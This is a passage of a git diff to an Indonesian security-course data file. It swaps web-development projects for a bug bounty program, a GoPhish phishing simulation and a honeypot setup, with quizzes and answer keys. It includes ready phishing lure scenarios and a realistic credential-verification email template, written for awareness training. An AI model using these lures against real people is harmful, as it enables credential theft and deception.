+\`\`\`text
+Level 1 - Initial    : ad-hoc, tidak terdokumentasi
+Level 2 - Repeatable : sebagian terdokumentasi
+Level 3 - Defined    : prosedur formal, konsisten
+Level 4 - Managed    : metrik & KPI
+Level 5 - Optimized  : continuous improvement
+\`\`\`
+
+## Deliverables
+
+\`\`\`text
+1. Audit charter & methodology
+2. Risk register hasil audit
+3. Gap analysis matrix vs framework
+4. Final report (executive + detailed)
+5. Remediation roadmap (12 bulan)
+6. Presentation ke management
+\`\`\`
+
+> Audit keamanan yang baik memberikan peta jalan — bukan hanya daftar masalah. Prioritaskan rekomendasi berdasarkan risk dan business impact, bukan teknis semata.`,
     quiz: [
       {
-        question: "Apa keuntungan menggunakan refresh token?",
-        options: [
-          "Membuat login lebih lambat",
-          "Access token bisa berumur pendek (aman), tapi user tidak perlu login ulang terus",
-          "Menghemat storage database",
-          "Menghindari penggunaan password"
-        ],
+        question: "Perbedaan audit keamanan dengan pentest?",
+        options: ["Sama", "Audit fokus compliance & policy, pentest fokus eksploitasi teknis", "Audit lebih teknis", "Pentest lebih lambat"],
         answer: 1,
-        explanation: "Refresh token memungkinkan access token berumur pendek (15 menit) untuk keamanan, tapi user tetap login karena refresh token (7 hari) bisa generate access token baru."
+        explanation: "Audit keamanan fokus pada kepatuhan, kebijakan, dan postur keseluruhan, sementara pentest fokus eksploitasi teknis kerentanan."
       },
       {
-        question: "Mengapa perlu rate limiting di endpoint login?",
-        options: [
-          "Mempercepat server",
-          "Mencegah brute force attack",
-          "Menghemat bandwidth",
-          "Untuk analytics"
-        ],
-        answer: 1,
-        explanation: "Rate limiting membatasi jumlah request per IP/waktu, mencegah attacker menebak password dengan mencoba ribuan kombinasi (brute force)."
+        question: "Framework manajemen risiko dari NIST?",
+        options: ["NIST CSF", "ISO 9001", "PCI-DSS", "GDPR"],
+        answer: 0,
+        explanation: "NIST Cybersecurity Framework (CSF) berisi 5 fungsi: Identify, Protect, Detect, Respond, Recover."
       },
       {
-        question: "Apa manfaat OAuth (Google/GitHub login)?",
-        options: [
-          "Menghilangkan kebutuhan password",
-          "User tidak perlu buat akun baru, lebih aman & nyaman",
-          "Server tidak butuh database",
-          "Membuat website lebih cepat"
-        ],
-        answer: 1,
-        explanation: "OAuth memungkinkan user login dengan akun Google/GitHub yang sudah ada—lebih nyaman (tidak perlu ingat password baru) dan lebih aman (provider handle security)."
+        question: "Apa itu MFA?",
+        options: ["Multi-Factor Authentication", "Main Frame Access", "Manual File Access", "Mass File Archive"],
+        answer: 0,
+        explanation: "MFA (Multi-Factor Authentication) mengharuskan lebih dari satu faktor autentikasi (password + OTP/biometrik)."
       }
     ]
   },
   {
     level: 7,
     order: 4,
-    title: "Dashboard Admin",
-    slug: "project-dashboard-admin",
-    description: "Bangun dashboard admin lengkap dengan charts, tables, CRUD, dan manajemen data.",
-    icon: "📊",
+    title: "Bug Bounty Program",
+    slug: "project-bug-bounty",
+    description: "Menyusun program bug bounty untuk sebuah perusahaan.",
+    icon: "💰",
     isProject: true,
-    content: `# Project: Dashboard Admin
+    content: `# Bug Bounty Program
 
-**Dashboard Admin** adalah project yang fokus pada visualisasi data, manajemen resource, dan operasi CRUD yang kompleks. Project ini mengasah skill frontend (charts, tables) dan backend (API, query kompleks).
+Pada proyek ini Anda akan **menyusun program bug bounty** end-to-end untuk sebuah perusahaan (nyata atau simulasi). Bug bounty adalah program yang memberi imbalan kepada peneliti independen yang menemukan & melaporkan kerentanan — model crowdsourced security yang efektif.
 
-## Fitur Utama
+## Tahap Penyusunan
 
-### Dashboard Overview
-- **Statistik cards** (total user, revenue, orders, dll)
-- **Charts** (line, bar, pie, area) untuk visualisasi
-- **Recent activity** feed
-- **Quick actions** shortcut
-- **Calendar** event
-
-### Manajemen Data (CRUD)
-- **User management** (list, search, filter, sort, pagination)
-- **Product management** (CRUD dengan upload gambar)
-- **Order management** (view, update status)
-- **Category management**
-- **Bulk actions** (select multiple, delete, export)
-
-### Analitik & Report
-- **Sales report** dengan filter tanggal
-- **User growth** chart
-- **Top products** analysis
-- **Export** ke Excel/PDF
-- **Custom date range** picker
-
-### Sistem
-- **Role & permission** (admin, editor, viewer)
-- **Activity log** (audit trail)
-- **Settings** (profile, preferences)
-- **Notifications** (real-time via WebSocket)
-- **Dark/Light mode**
-
-## Tech Stack
-
-### Frontend
-- **React** atau Next.js
-- **Tailwind CSS** + component library (shadcn/ui, Ant Design, MUI)
-- **Recharts** atau Chart.js untuk visualisasi
-- **React Table** (TanStack Table) untuk data tables
-- **React Hook Form + Zod** untuk form
-
-### Backend
-- **Node.js + Express**
-- **Mongoose** (MongoDB)
-- **JWT auth** dengan role middleware
-- **Multer** untuk upload
-- **exceljs** atau pdfkit untuk export
-- **Socket.io** untuk real-time notifications
-
-## Struktur Database
-
-\`\`\`javascript
-// User
-{ nama, email, role, status, avatar, createdAt }
-
-// Product
-{ nama, deskripsi, harga, stok, kategori, gambar, status }
-
-// Order
-{ 
-  user, items: [{ product, qty, harga }], 
-  total, status: "pending"|"paid"|"shipped"|"done",
-  createdAt 
-}
-
-// Activity Log
-{ user, aksi: "create"|"update"|"delete", target, detail, timestamp }
+\`\`\`text
+1. Stakeholder alignment (budget, scope, goals)
+2. Pilih platform (HackerOne, Bugcrowd, Intigriti, self-hosted)
+3. Definisikan scope & out-of-scope
+4. Tetapkan reward tier (table)
+5. Buat vulnerability rating guidelines
+6. Tulis policy (disclosure, safe harbor)
+7. Siapkan triage team
+8. Internal dry-run (private program)
+9. Public launch
+10. Continuous improvement
 \`\`\`
 
-## Struktur Frontend
+## Contoh Reward Table
 
-\`\`\`
-dashboard-admin/
-├── src/
-│   ├── components/
-│   │   ├── layout/
-│   │   │   ├── Sidebar.tsx
-│   │   │   ├── Header.tsx
-│   │   │   └── Layout.tsx
-│   │   ├── ui/              # reusable components
-│   │   ├── charts/
-│   │   └── tables/
-│   ├── pages/
-│   │   ├── Dashboard.tsx
-│   │   ├── Users.tsx
-│   │   ├── Products.tsx
-│   │   ├── Orders.tsx
-│   │   └── Reports.tsx
-│   ├── hooks/
-│   ├── lib/
-│   │   ├── api.ts
-│   │   └── auth.ts
-│   └── App.tsx
-└── package.json
+\`\`\`text
+Severity | Reward Range   | Contoh
+---------|----------------|----------------------------
+Critical | $5,000 - $20,000 | RCE, auth bypass, SQLi
+High     | $1,500 - $5,000  | Stored XSS, IDOR, SSRF
+Medium   | $500 - $1,500    | Reflected XSS, CSRF, info leak
+Low      | $100 - $500      | Open redirect, missing security header
 \`\`\`
 
-## Langkah Implementasi
+## Scope Definition
 
-### 1. Setup & Auth (2 hari)
-- Setup React + Tailwind
-- Implementasi login dengan JWT
-- Protected routes (hanya admin bisa akses)
-- Role-based menu (sidebar dinamis)
+\`\`\`yaml
+# scope.yml
+in_scope:
+  - "*.example.com"
+  - "api.example.com"
+  - "mobile app: com.example.app (iOS/Android)"
 
-### 2. Layout & Navigation (2 hari)
-- Sidebar dengan menu (Dashboard, Users, Products, Orders, Settings)
-- Header dengan search, notifications, profile dropdown
-- Responsive (sidebar collapse di mobile)
-- Breadcrumb navigation
-
-### 3. Dashboard Overview (2-3 hari)
-\`\`\`jsx
-function Dashboard() {
-  return (
-    <div>
-      {/* Statistik Cards */}
-      <div className="grid grid-cols-4 gap-4">
-        <StatCard title="Total User" value="1,234" trend="+12%" />
-        <StatCard title="Revenue" value="Rp 50jt" trend="+8%" />
-        <StatCard title="Orders" value="567" trend="-3%" />
-        <StatCard title="Products" value="89" trend="+5%" />
-      </div>
-      
-      {/* Charts */}
-      <div className="grid grid-cols-2 gap-4 mt-6">
-        <LineChart data={salesData} title="Sales 7 Hari" />
-        <BarChart data={categoryData} title="Kategori" />
-      </div>
-      
-      {/* Recent Orders Table */}
-      <RecentOrdersTable />
-    </div>
-  );
-}
+out_of_scope:
+  - "staging.example.com"
+  - "marketing.example.com"
+  - "DDoS, social engineering, physical"
+  - "Vulnerability di library pihak ketiga (report upstream)"
 \`\`\`
 
-### 4. User Management (3 hari)
-- Table dengan search, filter, sort, pagination
-- Modal create/edit user
-- Delete dengan konfirmasi
-- Bulk select & delete
-- Export ke Excel
+## Triage Workflow
 
-### 5. Product Management (3 hari)
-- Grid atau table view
-- CRUD dengan form lengkap
-- Upload multiple gambar
-- Filter by kategori
-- Stock management
-
-### 6. Charts & Analytics (2-3 hari)
-- Line chart untuk sales trend
-- Bar chart untuk perbandingan
-- Pie chart untuk distribusi
-- Date range picker untuk filter
-- Custom query di backend untuk aggregate data
-
-### 7. Real-time Notifications (2 hari)
-- WebSocket (Socket.io) untuk notif real-time
-- Toast notification saat order baru
-- Badge counter di header
-
-### 8. Export & Report (2 hari)
-\`\`\`javascript
-// Backend: Export ke Excel
-const ExcelJS = require("exceljs");
-
-app.get("/api/users/export", auth, async (req, res) => {
-  const users = await User.find();
-  const workbook = new ExcelJS.Workbook();
-  const sheet = workbook.addWorksheet("Users");
-  sheet.columns = [
-    { header: "Nama", key: "nama" },
-    { header: "Email", key: "email" },
-    { header: "Role", key: "role" }
-  ];
-  users.forEach(u => sheet.addRow(u));
-  
-  res.setHeader("Content-Type", "application/vnd.openxmlformats");
-  res.setHeader("Content-Disposition", "attachment; filename=users.xlsx");
-  await workbook.xlsx.write(res);
-  res.end();
-});
+\`\`\`bash
+# 1. Researcher submit report via platform
+# 2. Triage team validasi (repro & severity)
+# 3. Forward ke engineering team
+# 4. Engineering patch (SLA: Critical 7 hari)
+# 5. Verifikasi patch oleh researcher
+# 6. Bounty payout
+# 7. Public disclosure (setelah agreement)
 \`\`\`
 
-## Tantangan Lanjutan
+## Safe Harbor Policy
 
-- **Multi-tenant** (multiple organization dalam 1 dashboard)
-- **Customizable widgets** (drag & drop layout)
-- **Advanced filtering** dengan saved filters
-- **Real-time collaboration** (lihat user lain online)
-- **AI insights** (prediksi trend, anomali detection)
+\`\`\`text
+Kami berkomitmen untuk TIDAK menuntut secara hukum
+peneliti yang:
 
-## Tips UX untuk Dashboard
+1. Menguji hanya pada akun miliknya sendiri
+2. Tidak merusak data atau menyebabkan downtime
+3. Tidak mengakses data user lain
+4. Melaporkan temuan dalam 24 jam
+5. Memberi waktu 90 hari sebelum disclosure
+6. Tidak mengeksploitasi temuan untuk keuntungan
+\`\`\`
 
-- **Loading state**: skeleton saat fetch data
-- **Empty state**: tampilan saat tidak ada data
-- **Error handling**: tampilkan error yang jelas
-- **Keyboard shortcuts** untuk power user
-- **Performance**: lazy load, virtualization untuk table besar
+## Metrics & KPI
 
-> **Best Practice:** Gunakan component library (shadcn/ui, Ant Design) untuk konsistensi UI. Optimasi performance dengan pagination dan virtual scroll untuk data besar.`,
+\`\`\`text
+- Reports received per month
+- Valid bug rate (% valid dari total report)
+- Mean time to triage (target < 24 jam)
+- Mean time to resolution (target Critical < 14 hari)
+- Repeat researchers (loyalty)
+- Cost per valid vulnerability
+- Coverage (subdomain/api tested)
+\`\`\`
+
+## Deliverables
+
+\`\`\`text
+1. Program policy document
+2. Scope & reward table
+3. Vulnerability rating guideline (VRT)
+4. Triage SOP + playbook
+5. Disclosure policy
+6. Mock launch simulation (5-10 dummy report)
+7. Dashboard KPI tracking
+8. Pitch deck ke management (ROI analysis)
+\`\`\`
+
+> Bug bounty bukan pengganti pentest — melainkan pelengkap. Kombinasikan dengan internal pentest, automated scanning, dan bug bounty untuk pertahanan berlapis (defense in depth).`,
     quiz: [
       {
-        question: "Library apa yang umum digunakan untuk membuat charts di React?",
-        options: ["axios", "Recharts atau Chart.js", "mongoose", "express"],
-        answer: 1,
-        explanation: "Recharts dan Chart.js adalah library populer untuk visualisasi data di React. Recharts lebih React-friendly, Chart.js lebih fleksibel."
+        question: "Platform bug bounty populer?",
+        options: ["HackerOne", "Upwork", "Fiverr", "Freelancer"],
+        answer: 0,
+        explanation: "HackerOne adalah salah satu platform bug bounty paling populer, bersama Bugcrowd dan Intigriti."
       },
       {
-        question: "Apa pentingnya role & permission di dashboard admin?",
-        options: [
-          "Mempercepat loading",
-          "Membatasi akses user sesuai role (admin, editor, viewer)",
-          "Mengkompres data",
-          "Render charts"
-        ],
+        question: "Apa itu Safe Harbor policy?",
+        options: ["Tempat berlabuh kapal", "Jaminan tidak dituntut hukum untuk peneliti good faith", "Asuransi bug bounty", "Bonus peneliti"],
         answer: 1,
-        explanation: "Role & permission memastikan user hanya bisa akses fitur sesuai levelnya. Editor mungkin bisa edit konten tapi tidak bisa hapus user, viewer hanya bisa lihat."
+        explanation: "Safe Harbor policy adalah komitmen perusahaan untuk tidak menuntut hukum peneliti yang melakukan testing dengan itikad baik dan mengikuti aturan."
       },
       {
-        question: "Mengapa dashboard perlu pagination di table dengan banyak data?",
-        options: [
-          "Agar lebih mudah dihitung",
-          "Performance—load semua data sekalian akan lambat",
-          "Untuk SEO",
-          "Tidak perlu pagination"
-        ],
-        answer: 1,
-        explanation: "Load ribuan baris sekaligus akan lambat dan memakan memori. Pagination hanya load 10-50 baris per halaman, jauh lebih cepat dan ringan."
+        question: "Severity untuk kerentanan RCE biasanya?",
+        options: ["Low", "Medium", "High", "Critical"],
+        answer: 3,
+        explanation: "Remote Code Execution (RCE) umumnya diklasifikasikan sebagai Critical severity karena impact sangat tinggi."
       }
     ]
   },
   {
     level: 7,
     order: 5,
-    title: "E-Commerce Sederhana",
-    slug: "project-ecommerce",
-    description: "Bangun toko online lengkap dengan katalog, cart, checkout, dan payment integration.",
-    icon: "🛒",
+    title: "Phishing Simulation",
+    slug: "project-phishing-simulation",
+    description: "Membuat kampanye simulasi phishing untuk awareness training.",
+    icon: "📧",
     isProject: true,
-    content: `# Project: E-Commerce Sederhana
+    content: `# Phishing Simulation
 
-**E-Commerce Sederhana** adalah project paling komprehensif yang menggabungkan semua skill: frontend, backend, database, autentikasi, payment, dan banyak fitur kompleks. Project ini adalah showcase terbaik untuk portofolio kamu.
+Pada proyek ini Anda akan membangun **kampanye simulasi phishing** untuk awareness training karyawan. Tujuannya mengukur dan meningkatkan ketahanan manusia (human layer) terhadap serangan phishing — vektor serangan #1 di dunia.
 
-## Fitur Utama
+## Komponen Simulasi
 
-### Customer (Pembeli)
-- **Browse produk** dengan filter (kategori, harga, rating)
-- **Search** produk dengan autocomplete
-- **Detail produk** dengan gambar, deskripsi, review
-- **Cart** (tambah, hapus, ubah qty)
-- **Wishlist** (simpan favorit)
-- **Checkout** dengan alamat pengiriman
-- **Payment** (Midtrans, Xendit, atau simulasi)
-- **Order history** dan tracking
-- **Review & rating** produk
-- **Profile management**
-
-### Admin (Penjual)
-- **Dashboard** dengan statistik penjualan
-- **Product CRUD** (dengan multiple gambar, variant)
-- **Order management** (update status, shipping)
-- **Customer management**
-- **Category & brand management**
-- **Promo/voucher** management
-- **Sales report** dan analytics
-- **Inventory management** (stok)
-
-### Sistem
-- **Autentikasi** (register, login, JWT, OAuth)
-- **Role-based access** (customer, admin)
-- **Search engine** (full-text search)
-- **Email notification** (order confirmation, shipping)
-- **Real-time** stock update
-
-## Tech Stack
-
-### Frontend
-- **Next.js** (SSR untuk SEO produk)
-- **Tailwind CSS** + shadcn/ui
-- **Zustand** atau Redux (state management cart)
-- **React Query** (data fetching & caching)
-
-### Backend
-- **Node.js + Express**
-- **Mongoose** (MongoDB)
-- **JWT** + **bcrypt**
-- **Midtrans/Xendit SDK** (payment gateway)
-- **Nodemailer** (email)
-- **Multer + Cloudinary** (gambar)
-- **Socket.io** (real-time notif)
-
-### Third-party
-- **Midtrans** atau **Xendit** (payment)
-- **Cloudinary** (image storage)
-- **RajaOngkir API** (cek ongkir)
-- **SendGrid** (email transactional)
-
-## Database Schema
-
-\`\`\`javascript
-// Product
-{
-  nama: String,
-  slug: String,
-  deskripsi: String,
-  harga: Number,
-  hargaDiskon: Number,
-  stok: Number,
-  kategori: ObjectId,
-  brand: String,
-  gambar: [String],
-  variant: [{ nama: String, opsi: [String] }], // ukuran, warna
-  rating: Number,
-  jumlahReview: Number,
-  terjual: Number,
-  status: "active" | "draft" | "archived"
-}
-
-// Cart
-{ user: ObjectId, items: [{ product: ObjectId, qty: Number, variant: Object }] }
-
-// Order
-{
-  user: ObjectId,
-  items: [{ product, qty, harga, subtotal }],
-  total: Number,
-  ongkir: Number,
-  alamat: { penerima, telepon, alamatLengkap, kota, kodePos },
-  status: "pending" | "paid" | "shipped" | "delivered" | "cancelled",
-  payment: { metode, transactionId, status },
-  createdAt: Date
-}
-
-// Review
-{ product: ObjectId, user: ObjectId, rating: Number, teks: String, createdAt }
+\`\`\`text
+1. Platform     - GoPhish (open-source) / KingPhisher
+2. Email server - SMTP relay (Amazon SES, Mailgun)
+3. Landing page - halaman edukasi saat klik
+4. Tracking     - who opened, clicked, submitted
+5. Reporting    - dashboard per departemen
+6. Training     - modul setelah klik
 \`\`\`
 
-## Langkah Implementasi
+## Setup GoPhish
 
-### 1. Planning & Setup (2 hari)
-- Rancang database schema
-- Setup project (Next.js + Express)
-- Konfigurasi environment (.env)
-- Setup MongoDB Atlas, Cloudinary
+\`\`\`bash
+# Install GoPhish
+wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+unzip gophish-v0.12.1-linux-64bit.zip
+./gophish
 
-### 2. Auth & User (2-3 hari)
-- Register, login, JWT
-- Role customer & admin
-- Profile management
-- OAuth (opsional)
+# Akses https://127.0.0.1:3333 (admin password di log)
 
-### 3. Product Management (3-4 hari)
-- Admin: CRUD produk dengan multiple gambar
-- Upload ke Cloudinary
-- Variant produk (size, color)
-- Category management
-- Frontend: list, filter, search, detail
-
-### 4. Cart & Checkout (3-4 hari)
-\`\`\`javascript
-// Cart state dengan Zustand
-const useCart = create((set) => ({
-  items: [],
-  addToCart: (product) => set((state) => ({
-    items: [...state.items, product]
-  })),
-  removeFromCart: (id) => set((state) => ({
-    items: state.items.filter(i => i.id !== id)
-  })),
-  total: () => get().items.reduce((sum, i) => sum + i.harga * i.qty, 0)
-}));
-
-// Checkout: simpan order ke DB
-app.post("/api/orders", auth, async (req, res) => {
-  const { items, alamat } = req.body;
-  const total = items.reduce((sum, i) => sum + i.harga * i.qty, 0);
-  const order = await Order.create({
-    user: req.user.id, items, total, alamat, status: "pending"
-  });
-  // Buat payment di Midtrans
-  const payment = await midtrans.createTransaction({
-    transaction_details: { order_id: order._id, gross_amount: total }
-  });
-  res.json({ order, payment });
-});
+# Konfigurasi:
+# 1. Sending Profile  - SMTP relay
+# 2. Landing Page     - halaman edukasi
+# 3. Email Template   - isi email phishing
+# 4. Users & Groups   - target karyawan
+# 5. Campaign         - gabungkan semua
 \`\`\`
 
-### 5. Payment Integration (2-3 hari)
-- Integrasi Midtrans/Xendit
-- Handle webhook (payment success → update order)
-- Email konfirmasi setelah pembayaran
-- Order status tracking
+## Skenario Phishing
 
-### 6. Order Management Admin (2 hari)
-- List order dengan filter status
-- Update status (paid → shipped → delivered)
-- Input no resi
-- Notification ke customer via email
+\`\`\`text
+SKENARIO 1: IT Helpdesk Password Reset
+  Subject: [URGENT] Reset Password Anda Dalam 24 Jam
+  Template: tiruan logo internal, link ke landing page
+  Landing: "Anda terjebak simulasi phishing! Pelajari ciri-cirinya..."
 
-### 7. Review & Rating (2 hari)
-- Customer bisa review produk yang sudah dibeli
-- Rating otomatis update di produk
-- Moderasi review oleh admin
+SKENARIO 2: HR - Bonus Update
+  Subject: Update Data Bank Untuk Pembayaran Bonus
+  Landing: modul edukasi 5 menit
 
-### 8. Search & Filter (2 hari)
-- Full-text search di produk
-- Filter: kategori, harga, rating, brand
-- Sort: termurah, termahal, terlaris, terbaru
-- Pagination dengan infinite scroll
-
-### 9. Admin Dashboard (2-3 hari)
-- Statistik penjualan (revenue, orders, products)
-- Chart penjualan per bulan
-- Top products
-- Recent orders
-- Low stock alert
-
-### 10. Testing & Deployment (2 hari)
-- Test flow lengkap: register → belanja → checkout → bayar
-- Deploy frontend (Vercel) + backend (Railway) + DB (Atlas)
-- Setup custom domain
-
-## Tantangan Lanjutan
-
-- **Multi-vendor** (marketplace dengan banyak penjual)
-- **Live chat** customer service
-- **Wishlist & save for later**
-- **Loyalty points** system
-- **Coupon/voucher** kompleks (persen, nominal, free shipping)
-- **Recommendation engine** (produk terkait)
-- **PWA** untuk mobile app-like experience
-- **Internationalization** (multi-currency, multi-language)
-
-## Contoh: Webhook Payment
-
-\`\`\`javascript
-app.post("/api/payment/webhook", async (req, res) => {
-  const { order_id, transaction_status } = req.body;
-  
-  // Verifikasi signature dari Midtrans
-  if (!verifySignature(req.body)) return res.status(403).send();
-  
-  const order = await Order.findById(order_id);
-  if (!order) return res.status(404).send();
-  
-  if (transaction_status === "settlement" || transaction_status === "capture") {
-    order.status = "paid";
-    // Kurangi stok produk
-    for (const item of order.items) {
-      await Product.findByIdAndUpdate(item.product, { $inc: { stok: -item.qty } });
-    }
-    // Kirim email konfirmasi
-    await sendOrderConfirmation(order);
-  }
-  await order.save();
-  res.status(200).send("OK");
-});
+SKENARIO 3: Cloud Storage Share
+  Subject: John shared "Q4_Report.xlsx" with you
+  Landing: pelatihan verifikasi pengirim
 \`\`\`
 
-> **Best Practice:** Mulai dengan MVP—product list, cart, checkout simulasi (tanpa payment real). Tambah payment gateway setelah flow dasar berjalan. Selalu handle webhook dengan verifikasi signature.`,
+## Tracking & Metrik
+
+\`\`\`bash
+# GoPhish melaporkan per karyawan:
+# - Email Opened
+# - Link Clicked
+# - Form Submitted
+# - Reported (jika ada tombol "Report Phishing")
+
+# KPI:
+- Phish-prone percentage (PPP) = klik / total dikirim
+- Report rate = lapor / total dikirim
+- Improvement over time (target PPP < 5%)
+- Per departemen, per skenario
+\`\`\`
+
+## Contoh Email Template
+
+\`\`\`html
+<!-- Template phishing yang realistis -->
+<html>
+<body style="font-family: Arial;">
+  <img src="https://internal-corp.example.com/logo.png">
+  <h2>Peringatan Keamanan Akun</h2>
+  <p>Kami mendeteksi aktivitas login mencurigakan pada akun Anda.
+     Untuk mengamankan akun, silakan verifikasi identitas dalam 24 jam.</p>
+  <a href="{{.URL}}" style="background:#0066cc;color:#fff;padding:10px 20px;">
+    Verifikasi Sekarang
+  </a>
+  <p style="font-size:10px;color:gray;">© 2025 Internal Corp</p>
+</body>
+</html>
+\`\`\`
+
+## Edukasi Pasca Klik
+
+\`\`\`text
+Saat karyawan klik → redirect ke landing page:
+1. Banner besar: "Anda baru saja klik phishing simulasi!"
+2. Penjelasan ciri-ciri email yang baru dilihat
+3. Tips: cek URL, cek pengirim, hover link
+4. Kuis singkat 3 pertanyaan
+5. Sertifikat "Phishing Awareness" bila lulus
+
+Lanjut: karyawan yang sering klik wajib training intensif
+\`\`\`
+
+## Deliverables
+
+\`\`\`text
+1. Kampanye phishing yang berjalan (GoPhish)
+2. Minimal 3 skenario (template + landing)
+3. Dashboard laporan per departemen
+4. Modul training pasca-klik
+5. Policy "report phishing" + tombol di email client
+6. Executive summary hasil kampanye
+7. Roadmap program berkelanjutan (quarterly)
+\`\`\`
+
+> Phishing simulation bukan untuk menjebak atau mempermalukan karyawan. Fokus pada edukasi dan budaya — karyawan yang melaporkan phishing adalah aset pertahanan, bukan titik lemah.`,
     quiz: [
       {
-        question: "Mengapa e-commerce perlu webhook dari payment gateway?",
-        options: [
-          "Untuk mempercepat website",
-          "Menerima notifikasi otomatis saat pembayaran berhasil dan update order",
-          "Untuk menampilkan gambar",
-          "Mengirim email ke customer"
-        ],
-        answer: 1,
-        explanation: "Webhook memungkinkan payment gateway (Midtrans) memberi tahu server kita secara otomatis saat pembayaran berhasil, sehingga status order bisa diupdate tanpa polling manual."
+        question: "Platform open-source untuk simulasi phishing?",
+        options: ["GoPhish", "Burp Suite", "Metasploit", "Nessus"],
+        answer: 0,
+        explanation: "GoPhish adalah platform open-source populer untuk menjalankan kampanye simulasi phishing dan tracking hasilnya."
       },
       {
-        question: "State management library apa yang cocok untuk cart di React?",
-        options: ["axios", "Zustand atau Redux", "mongoose", "tailwind"],
-        answer: 1,
-        explanation: "Zustand atau Redux cocok untuk state global seperti cart yang diakses di banyak komponen. axios untuk HTTP request, bukan state."
+        question: "Metrik utama keberhasilan program phishing simulation?",
+        options: ["Phish-prone percentage (PPP)", "CPU usage", "RAM", "Disk space"],
+        answer: 0,
+        explanation: "Phish-prone percentage (PPP) mengukur persentase karyawan yang klik — semakin rendah semakin baik."
       },
       {
-        question: "Apa yang harus dilakukan saat webhook payment diterima?",
-        options: [
-          "Langsung update status order tanpa verifikasi",
-          "Verifikasi signature webhook, baru update order dan kurangi stok",
-          "Kirim email ke semua user",
-          "Hapus data cart"
-        ],
+        question: "Yang harus dilakukan saat karyawan klik phishing simulasi?",
+        options: ["Dipecat", "Didedukasi, bukan dipermalukan", "Dipidana", "Didiamkan"],
         answer: 1,
-        explanation: "Selalu verifikasi signature webhook untuk memastikan request benar-benar dari payment gateway (bukan attacker). Setelah valid, update status order dan kurangi stok produk."
+        explanation: "Fokus simulasi adalah edukasi. Karyawan yang klik diarahkan ke modul pembelajaran, bukan dipermalukan atau dihukum."
       }
     ]
   },
   {
     level: 7,
     order: 6,
-    title: "Website Belajar Coding",
-    slug: "project-belajar-coding",
-    description: "Bangun platform e-learning coding interaktif dengan materi, quiz, dan progress tracking.",
-    icon: "🎓",
+    title: "Build a Honeypot",
+    slug: "project-honeypot",
+    description: "Membangun honeypot untuk menangkap dan menganalisis serangan.",
+    icon: "🍯",
     isProject: true,
-    content: `# Project: Website Belajar Coding
+    content: `# Build a Honeypot
 
-**Website Belajar Coding** adalah project paling kompleks dan menarik—kamu akan membangun platform e-learning seperti yang sedang kamu gunakan sekarang! Project ini menggabungkan semua skill: frontend, backend, database, autentikasi, dan content management.
+Pada proyek terakhir ini Anda akan membangun **honeypot** — sistem yang sengaja dibuat rentan untuk menarik penyerang, sehingga aktivitas mereka bisa direkam dan dianalisis. Honeypot adalah alat intelijen ancaman berharga yang memberi visibilitas TTP (Tactics, Techniques, Procedures) penyerang di dunia nyata.
 
-## Fitur Utama
+## Jenis Honeypot
 
-### Student (Pembelajar)
-- **Learning path** dengan level (1-7)
-- **Materi** dalam format markdown dengan code examples
-- **Code editor** interaktif (jalankan kode di browser)
-- **Quiz** dengan auto-grading
-- **Progress tracking** (materi selesai, level, skor)
-- **Achievement/badges** sistem gamification
-- **Sertifikat** setelah menyelesaikan level
-- **Leaderboard** kompetisi
-- **Forum diskusi** antar student
-- **Bookmark** materi favorit
+\`\`\`text
+Low-interaction  - simulasi service (aman, info terbatas)
+  Contoh: Honeyd, Cowrie (SSH/Telnet)
 
-### Instructor (Pengajar)
-- **CMS** untuk membuat materi (markdown editor)
-- **Quiz builder** dengan multiple choice
-- **Analytics** progres student
-- **Manajemen student** (enroll, progress)
-- **Komentar/moderasi** forum
+Medium-interaction - simulasi lebih realistis
+  Contoh: Dionaea (SMB, FTP), Conpot (ICS)
 
-### Admin
-- **User management** (student, instructor, admin)
-- **Content management** (approve materi)
-- **Site settings**
-- **Analytics dashboard**
+High-interaction - sistem nyata penuh (info lengkap, risiko)
+  Contoh: real VM yang diizinkan dikompromi
 
-## Tech Stack
-
-### Frontend
-- **Next.js** (SSR/SSG untuk SEO materi)
-- **Tailwind CSS** + shadcn/ui
-- **Monaco Editor** (code editor seperti VS Code)
-- **react-markdown** + rehype-highlight (render materi)
-- **Zustand** (state management)
-- **React Query** (data fetching)
-
-### Backend
-- **Node.js + Express** atau Next.js API routes
-- **Prisma** atau **Mongoose** (database ORM)
-- **PostgreSQL** atau MongoDB
-- **JWT** + bcrypt
-- **Code execution sandbox** (Docker untuk run kode user)
-- **Bull/BullMQ** (job queue untuk grading)
-
-### Third-party
-- **Judge0** atau **Piston API** (execute code user)
-- **Stripe/Midtrans** (subscription premium)
-- **SendGrid** (email notifikasi)
-- **Sentry** (error monitoring)
-
-## Database Schema
-
-\`\`\`javascript
-// Level
-{ 
-  level: Number, 
-  judul: String, 
-  deskripsi: String, 
-  icon: String,
-  order: Number 
-}
-
-// Material
-{
-  level: Number,
-  order: Number,
-  judul: String,
-  slug: String,
-  deskripsi: String,
-  konten: String,        // markdown
-  isProject: Boolean,
-  quiz: [{
-    pertanyaan: String,
-    opsi: [String],
-    jawaban: Number,
-    penjelasan: String
-  }]
-}
-
-// UserProgress
-{
-  user: ObjectId,
-  material: ObjectId,
-  completed: Boolean,
-  quizScore: Number,
-  completedAt: Date
-}
-
-// User
-{
-  nama, email, password, role: "student"|"instructor"|"admin",
-  level: Number,         // level tertinggi yang diakses
-  xp: Number,            // experience points
-  badges: [String],
-  enrolledAt: Date
-}
-
-// Submission (untuk project)
-{
-  user: ObjectId,
-  project: ObjectId,
-  kode: String,
-  status: "pending"|"reviewed"|"approved",
-  feedback: String,
-  submittedAt: Date
-}
+Research honeypot - untuk riset TTP
+Production honeypot - untuk deteksi di jaringan produksi
 \`\`\`
 
-## Langkah Implementasi
+## Cowrie — SSH/Telnet Honeypot
 
-### 1. Planning & Setup (2 hari)
-- Rancang schema database
-- Setup Next.js + Prisma/Mongoose
-- Konfigurasi database (PostgreSQL/Atlas)
-- Setup authentication
+\`\`\`bash
+# Install Cowrie di VM terisolasi
+git clone https://github.com/cowrie/cowrie.git
+cd cowrie
+python3 -m venv cowrie-env
+source cowrie-env/bin/activate
+pip install -r requirements.txt
 
-### 2. Auth & User Roles (2-3 hari)
-- Register, login, JWT
-- Role: student, instructor, admin
-- Middleware proteksi route by role
-- Profile & settings
+# Konfigurasi
+cp etc/cowrie.cfg.dist etc/cowrie.cfg
+# Edit: hostname, listen_port (2222), dst
 
-### 3. Content Management (3-4 hari)
-- Schema Level & Material
-- Instructor CMS: CRUD materi dengan markdown editor
-- Quiz builder UI
-- Preview materi sebelum publish
+# Jalankan
+bin/cowrie start
 
